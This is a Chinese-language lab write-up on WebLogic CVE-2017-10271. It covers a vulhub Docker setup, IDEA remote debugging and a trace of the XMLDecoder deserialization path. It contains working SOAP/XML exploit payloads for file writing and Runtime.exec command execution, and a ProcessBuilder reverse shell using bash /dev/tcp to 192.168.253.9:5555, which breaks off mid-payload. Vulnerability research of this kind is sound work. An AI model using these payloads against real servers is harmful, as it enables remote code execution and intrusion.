<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>复现可以使用vulhub项目 <a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub">(vulhub)</a></p>
<p>进入目录<code>vulhub/weblogic/CVE-2017-10271</code>，然后修改<code>docker-compose.yml</code>文件，并添加调试端口<code>- &quot;8453:8453&quot;</code>，如下所示</p>
<p><img src="/2022/08/14/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-CVE-2017-10271%EF%BC%88IDEA+Docker%EF%BC%89/1690989062177.png" alt="1690989062177"></p>
<p>之后使用<code>docker-compose up -d</code>命令下载并拉起docker服务，使用<code>docker ps</code>命令查看docker服务的运行情况以及docker id，并使用命令<code>docker exec -it d4eb3d7f9dfd /bin/bash</code>进入到容器内部</p>
<p><img src="/2022/08/14/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-CVE-2017-10271%EF%BC%88IDEA+Docker%EF%BC%89/1690989494567.png" alt="1690989494567"></p>
<p>使用<code>vi</code>命令修改<code>/root/Oracle/Middleware/user_projects/domains/base_domain/bin/setDomainEnv.sh</code> 文件，并手动添加两个调试参数</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">debugFlag=<span class="string">&quot;true&quot;</span></span><br><span class="line"><span class="built_in">export</span> debugFlag</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/14/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-CVE-2017-10271%EF%BC%88IDEA+Docker%EF%BC%89/1690989740007.png" alt="1690989740007"></p>
<p>修改完成之后手动运行一下这个脚本，如下所示</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@d4eb3d7f9dfd:~/Oracle/Middleware# /root/Oracle/Middleware/user_projects/domains/base_domain/bin/setDomainEnv.sh</span><br></pre></td></tr></table></figure>

<p>然后退出容器，并重启这个容器</p>
<p>由于需要在本地远程调试weblogic，而本地没有源码，因此需要去容器把源码拉下来</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">//获取docker-id : <span class="string">&quot;d4eb3d7f9dfd&quot;</span></span><br><span class="line">docker ps</span><br><span class="line"></span><br><span class="line">//将容器内wlserver_10.3目录下的的源码复制一份到本地</span><br><span class="line">docker <span class="built_in">cp</span> d4eb3d7f9dfd:/root/Oracle/Middleware/wlserver_10.3 ./WebLogic_jars</span><br><span class="line"></span><br><span class="line">//打包为zip包，方便下载放在windows本地</span><br><span class="line">zip -r WebLogic_jars.zip WebLogic_jars/</span><br><span class="line"></span><br><span class="line">//导出依赖包，有两种方式，分别介绍</span><br><span class="line"></span><br><span class="line">//(1)大部分jar包位于modules目录，直接将整个目录烤出来，基本能满足调试需求</span><br><span class="line">docker <span class="built_in">cp</span> d4eb3d7f9dfd:/root/Oracle/Middleware/modules ./modules</span><br><span class="line">zip -r modules.zip modules/</span><br><span class="line"></span><br><span class="line">//(2)使用批量检索方式导出Middleware目录内所有jar包，若方法1依旧不全，则可以导出全部jar包进行调试</span><br><span class="line"><span class="built_in">cd</span> /root/Oracle/Middleware</span><br><span class="line"><span class="built_in">mkdir</span> <span class="built_in">test</span></span><br><span class="line">find ./ -name *.jar -<span class="built_in">exec</span> <span class="built_in">cp</span> &#123;&#125; ./test/ \;</span><br><span class="line">docker <span class="built_in">cp</span> d4eb3d7f9dfd:/root/Oracle/Middleware/test ./test</span><br><span class="line">zip -r test.zip <span class="built_in">test</span>/</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/14/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-CVE-2017-10271%EF%BC%88IDEA+Docker%EF%BC%89/1690990024755.png" alt="1690990024755"></p>
<p><img src="/2022/08/14/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-CVE-2017-10271%EF%BC%88IDEA+Docker%EF%BC%89/1690990334353.png" alt="1690990334353"></p>
<h2 id="idea配合Docker远程Debug"><a href="#idea配合Docker远程Debug" class="headerlink" title="idea配合Docker远程Debug"></a>idea配合Docker远程Debug</h2><p>将之拖到Windows本地文件夹中，由于<code>WebLogic_jars.zip</code>里面文件目录较深，若解压时所处目录较长，将无法正常解压所有文件，因此建议在根目录新建一个文件夹用于存放<code>wlserver_10.3</code>和<code>modules</code>，如下所示</p>
<p><img src="/2022/08/14/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-CVE-2017-10271%EF%BC%88IDEA+Docker%EF%BC%89/1691050453105.png" alt="1691050453105"></p>
<p>然后鼠标右击选择<code>wlserver_10.3</code>，并使用<code>idea</code>打开，右上角选择<code>Edit Configurations</code>  ，然后添加<code>Remote JVM Debug</code>，配置如下后选择<code>Apply</code>和<code>OK</code>，即可完成配置。</p>
<p><img src="/2022/08/14/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-CVE-2017-10271%EF%BC%88IDEA+Docker%EF%BC%89/1691050640956.png" alt="1691050640956"></p>
<p>然后将<code>wlserver_10.3/server/lib</code>和<code>modules</code>这两个文件夹添加到<code>library</code>，左上角选择<code>File</code>—&gt;<code>Project Structure</code>，具体操作如下所示</p>
<p><img src="/2022/08/14/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-CVE-2017-10271%EF%BC%88IDEA+Docker%EF%BC%89/1691050848845.png" alt="1691050848845"></p>
<p><img src="/2022/08/14/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-CVE-2017-10271%EF%BC%88IDEA+Docker%EF%BC%89/1691050860094.png" alt="1691050860094"></p>
<p>右上角选择<code>Debug</code>按钮，若出现提示<code>Connected to the target VM, address: &#39;192.168.253.8:8453&#39;, transport: &#39;socket&#39;</code>，则说明<code>远程Debug</code>配置连接成功</p>
<p><img src="/2022/08/14/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-CVE-2017-10271%EF%BC%88IDEA+Docker%EF%BC%89/1691050941932.png" alt="1691050941932"></p>
<p>简单测试能否断点成功，找到文件<code>wlserver_10.3/server/lib/weblogic.jar!/weblogic/wsee/jaxws/WLSServletAdapter.class</code>，这里可以直接使用组合键<code>Ctrl+Shift+N</code>搜索<code>WLSServletAdapter.class</code>，并在<code>handle()</code>方法处打上断点</p>
<p><img src="/2022/08/14/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-CVE-2017-10271%EF%BC%88IDEA+Docker%EF%BC%89/1691051218615.png" alt="1691051218615"></p>
<p><img src="/2022/08/14/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-CVE-2017-10271%EF%BC%88IDEA+Docker%EF%BC%89/1691051295565.png" alt="1691051295565"></p>
<p>然后右上角选择断点，浏览器访问链接<code>http://192.168.253.8:7001/wls-wsat/CoordinatorPortType</code>，成功断点，如下所示</p>
<p><img src="/2022/08/14/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-CVE-2017-10271%EF%BC%88IDEA+Docker%EF%BC%89/1691051518430.png" alt="1691051518430"></p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>访问URL：<a target="_blank" rel="noopener" href="http://192.168.253.8:7001/wls-wsat/CoordinatorPortType">http://192.168.253.8:7001/wls-wsat/CoordinatorPortType</a></p>
<p>若出现如下页面，则说明存在该漏洞</p>
<p><img src="/2022/08/14/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-CVE-2017-10271%EF%BC%88IDEA+Docker%EF%BC%89/1693536452028.png" alt="1693536452028"></p>
<p>除了上述漏洞入口，下面是其他可以利用的URL</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/wls-wsat/CoordinatorPortType</span><br><span class="line">/wls-wsat/RegistrationPortTypeRPC</span><br><span class="line">/wls-wsat/ParticipantPortType</span><br><span class="line">/wls-wsat/RegistrationRequesterPortType</span><br><span class="line">/wls-wsat/CoordinatorPortType11</span><br><span class="line">/wls-wsat/RegistrationPortTypeRPC11</span><br><span class="line">/wls-wsat/ParticipantPortType11</span><br><span class="line">/wls-wsat/RegistrationRequesterPortType11</span><br></pre></td></tr></table></figure>

<p>构造如下POC</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">http://192.168.253.8:7001/wls-wsat/CoordinatorPortType</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.253.8:7001</span><br><span class="line"><span class="attribute">Pragma</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,eu;q=0.7,ja;q=0.6</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>b-user-id=84f0264e-a02a-70a0-a51d-74b587c8a089; ADMINCONSOLESESSION=dPBFkxCfQZtvZQpT83SLvyyTv5wTvXF49JQJBjy2M1f5bTpSvZYB!898710205</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/xml</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>705</span><br><span class="line"></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:soapenv</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">soapenv:Header</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;<span class="name">work:WorkContext</span> <span class="attr">xmlns:work</span>=<span class="string">&quot;http://bea.com/2004/06/soap/workarea/&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                <span class="tag">&lt;<span class="name">java</span> <span class="attr">version</span>=<span class="string">&quot;1.6.0&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.beans.XMLDecoder&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                    <span class="tag">&lt;<span class="name">object</span> <span class="attr">class</span>=<span class="string">&quot;java.io.PrintWriter&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                        <span class="tag">&lt;<span class="name">string</span>&gt;</span>servers/AdminServer/tmp/_WL_internal/wls-wsat/54p17w/war/test.txt<span class="tag">&lt;/<span class="name">string</span>&gt;</span><span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;println&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                        <span class="tag">&lt;<span class="name">string</span>&gt;</span>just_test<span class="tag">&lt;/<span class="name">string</span>&gt;</span><span class="tag">&lt;/<span class="name">void</span>&gt;</span><span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;close&quot;</span>/&gt;</span></span></span><br><span class="line"><span class="language-xml">                    <span class="tag">&lt;/<span class="name">object</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                <span class="tag">&lt;/<span class="name">java</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;/<span class="name">work:WorkContext</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">soapenv:Header</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">soapenv:Body</span>/&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>发包后如下所示</p>
<p><img src="/2022/08/14/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-CVE-2017-10271%EF%BC%88IDEA+Docker%EF%BC%89/1694440182814.png" alt="1694440182814"></p>
<p>访问对应的URL，发现写入成功</p>
<p><img src="/2022/08/14/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-CVE-2017-10271%EF%BC%88IDEA+Docker%EF%BC%89/1694440208521.png" alt="1694440208521"></p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="确认漏洞入口点"><a href="#确认漏洞入口点" class="headerlink" title="确认漏洞入口点"></a>确认漏洞入口点</h3><p>根据Payload访问路径，可以知道漏洞触发的Jar包，即该漏洞位于WebLogic Server WLS组件</p>
<p><img src="/2022/08/14/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-CVE-2017-10271%EF%BC%88IDEA+Docker%EF%BC%89/1694444771671.png" alt="1694444771671"></p>
<p>分析返回包信息中的调用栈</p>
<p><img src="/2022/08/14/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-CVE-2017-10271%EF%BC%88IDEA+Docker%EF%BC%89/1695116061244.png" alt="1695116061244"></p>
<p>将所有的<code>&lt;ns2:frame /&gt;</code>标签复制出来放在Notepad中，并重点关注<code>weblogic</code>下面的类文件，根据类名可以定位到处理的入口点为<code>weblogic.wsee.jaxws.workcontext.WorkContextServerTube</code>类中的<code>processRequest</code>方法</p>
<p><img src="/2022/08/14/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-CVE-2017-10271%EF%BC%88IDEA+Docker%EF%BC%89/1695116261947.png" alt="1695116261947"></p>
<h3 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h3><p>在<code>processRequest</code>方法处打上断点，并重新发包，成功断下点，我们将<code>var1</code>的值复制出来，如下所是</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">com.sun.xml.ws.api.message.Packet@137a9034 Content: <span class="meta">&lt;?xml version=&#x27;1.0&#x27; encoding=&#x27;UTF-8&#x27;?&gt;</span><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:soapenv</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">soapenv:Header</span>&gt;</span><span class="tag">&lt;<span class="name">work:WorkContext</span> <span class="attr">xmlns:work</span>=<span class="string">&quot;http://bea.com/2004/06/soap/workarea/&quot;</span> <span class="attr">xmlns:soapenv</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">java</span> <span class="attr">version</span>=<span class="string">&quot;1.6.0&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.beans.XMLDecoder&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">object</span> <span class="attr">class</span>=<span class="string">&quot;java.io.PrintWriter&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">string</span>&gt;</span>servers/AdminServer/tmp/_WL_internal/wls-wsat/54p17w/war/test.txt<span class="tag">&lt;/<span class="name">string</span>&gt;</span><span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;println&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">string</span>&gt;</span>just_test<span class="tag">&lt;/<span class="name">string</span>&gt;</span><span class="tag">&lt;/<span class="name">void</span>&gt;</span><span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;close&quot;</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">work:WorkContext</span>&gt;</span><span class="tag">&lt;/<span class="name">soapenv:Header</span>&gt;</span><span class="tag">&lt;<span class="name">soapenv:Body</span>/&gt;</span><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/14/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-CVE-2017-10271%EF%BC%88IDEA+Docker%EF%BC%89/1695117324578.png" alt="1695117324578"></p>
<p>Var2从var1中获取<code>&lt;work:WorkContext /&gt;</code>元素及其所有子元素的xml数据，然后比较其命名空间与本地名称是否与<code>WorkAreaConstants.WORK_AREA_HEADER</code>定义的QName对象相等，若相等，则返回一个Header对象，该对象包含了<code>&lt;work:WorkContext /&gt;</code>元素及其所有子元素的xml数据，接着进入<code>readHeaderOld</code>方法，我们选择继续跟进</p>
<p><img src="/2022/08/14/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-CVE-2017-10271%EF%BC%88IDEA+Docker%EF%BC%89/1695559808381.png" alt="1695559808381"></p>
<p><img src="/2022/08/14/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-CVE-2017-10271%EF%BC%88IDEA+Docker%EF%BC%89/1695559789530.png" alt="1695559789530"></p>
<p><img src="/2022/08/14/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-CVE-2017-10271%EF%BC%88IDEA+Docker%EF%BC%89/1695560787787.png" alt="1695560787787"></p>
<p>这里首先会创建一个<code>XMLStreamReader</code>对象用于读取解析XML，接着两个<code>nextTag()</code>是为了跳过前面两个XML标签元素，使用Debug工具查看当前元素名称，可以发现当前xml标签为<code>java</code>。随后会创建了一个<code>XMLStreamReaderToXMLStreamWriter</code>对象var3，用于将<code>XMLStreamReader</code>的内容复制到<code>XMLStreamWriter</code>，接着创建一个字节数组输出流var4和一个<code>XMLStreamWriter</code>对象var5，用于将<code>XMLStreamReader</code>的数据输出到var4，最后调用<code>bridge()</code>方法将var2中的xml数据复制到到var4中。到112行代码处，首先将var4转换为字节数组，利用该字节数组创建一个<code>ByteArrayInputStream</code>，最后用这个<code>ByteArrayInputStream</code>创建一个<code>WorkContextXmlInputAdapter</code>对象var6。如上代码均为处理xml数据，并无关键漏洞代码执行处，我们接着往下走，选择进入<code>receive()</code>方法。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var2.getLocalName()</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/14/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-CVE-2017-10271%EF%BC%88IDEA+Docker%EF%BC%89/1693553536985.png" alt="1693553536985"></p>
<p>这里首先定义了一个<code>WorkContextMapInterceptor</code>对象，然后调用了<code>receiveRequest()</code>方法去处理var1数据，我们依旧选择跟进去</p>
<p><img src="/2022/08/14/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-CVE-2017-10271%EF%BC%88IDEA+Docker%EF%BC%89/1695562647942.png" alt="1695562647942"></p>
<p>继续跟进</p>
<p><img src="/2022/08/14/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-CVE-2017-10271%EF%BC%88IDEA+Docker%EF%BC%89/1695562738686.png" alt="1695562738686"></p>
<p>进入<code>weblogic.workarea.WorkContextLocalMap#receiveRequest</code>方法，然后跟进<code>WorkContextEntryImpl#readEntry</code>方法</p>
<p><img src="/2022/08/14/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-CVE-2017-10271%EF%BC%88IDEA+Docker%EF%BC%89/1695562785374.png" alt="1695562785374"></p>
<p>进入<code>weblogic.workarea.spi.WorkContextEntryImpl#readEntry</code>方法，然后跟进<code>readUTF()</code></p>
<p><img src="/2022/08/14/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-CVE-2017-10271%EF%BC%88IDEA+Docker%EF%BC%89/1695562941061.png" alt="1695562941061"></p>
<p>最终调用执行了<code>readObject</code>方法，将xml反序列化后创建了一个<code>PrintWriter</code>对象，最后调用<code>println</code>方法将字符串写入到文件中</p>
<p><img src="/2022/08/14/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-CVE-2017-10271%EF%BC%88IDEA+Docker%EF%BC%89/1695563210277.png" alt="1695563210277"></p>
<p><img src="/2022/08/14/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-CVE-2017-10271%EF%BC%88IDEA+Docker%EF%BC%89/1695563773715.png" alt="1695563773715"></p>
<h3 id="Payload变形利用"><a href="#Payload变形利用" class="headerlink" title="Payload变形利用"></a>Payload变形利用</h3><p>利用上述<code>PrintWriter</code>对象可以是先任意文件写入，亦或者直接写入webshell，那么也可以利用其他对象来执行命令或者反弹Shell</p>
<h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><p>这里选择使用<code>java.lang.Runtime</code> 类的 <code>exec</code> 方法来执行系统命令</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:soapenv</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">work:WorkContext</span> <span class="attr">xmlns:work</span>=<span class="string">&quot;http://bea.com/2004/06/soap/workarea/&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">java</span> <span class="attr">version</span>=<span class="string">&quot;1.6.0&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.beans.XMLDecoder&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">object</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.Runtime&quot;</span> <span class="attr">method</span>=<span class="string">&quot;getRuntime&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;exec&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">string</span>&gt;</span>ping -c 10 127.0.0.1<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">work:WorkContext</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">soapenv:Body</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/14/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-CVE-2017-10271%EF%BC%88IDEA+Docker%EF%BC%89/1695564376687.png" alt="1695564376687"></p>
<p>由于没有回显，我们尝试执行常驻命令，然后查看目标系统中的进程链，这里可以看到命令已经成功被执行</p>
<p><img src="/2022/08/14/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-CVE-2017-10271%EF%BC%88IDEA+Docker%EF%BC%89/1695564406834.png" alt="1695564406834"></p>
<h4 id="反弹Shell"><a href="#反弹Shell" class="headerlink" title="反弹Shell"></a>反弹Shell</h4><p>一个最常见的反弹shell命令为<code>bash -i &gt;&amp; /dev/tcp/192.168.253.9/5555 0&gt;&amp;1</code>，但由于<code>Runtime.exec</code>不能直接执行包含 shell 命令或重定向操作符的复杂命令，因此这里我们可以选择使用<code>ProcessBuilder</code>来处理执行反弹shell的代码，反弹shell的完整命令为<code>bash -c &quot;bash -i &gt;&amp; /dev/tcp/192.168.253.9/5555 0&gt;&amp;1&quot;</code>。</p>
<p>这里我们首先使用<code>&lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;</code>创建一个<code>ProcessBuilder</code> 类的实例，然后初始化<code>ProcessBuilder</code> 的命令和参数并创建一个长度为3的字符串数组来保存这些值；将反弹shell命令拆成三份之后，最终调用<code>ProcessBuilder</code> 实例的 <code>start</code> 方法来启动进程执行命令，构造xml数据如下所示</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:soapenv</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">work:WorkContext</span> <span class="attr">xmlns:work</span>=<span class="string">&quot;http://bea.com/2004/06/soap/workarea/&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">java</span> <span class="attr">version</span>=<span class="string">&quot;1.6.0&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.beans.XMLDecoder&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">void</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">array</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.String&quot;</span> <span class="attr">length</span>=<span class="string">&quot;3&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;0&quot;</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">string</span>&gt;</span>/bin/bash<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">string</span>&gt;</span>-c<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;2&quot;</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">string</span>&gt;</span>bash -i &gt;&amp; /dev/tcp/192.168.253.9/5555 0&gt;&amp;1<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span 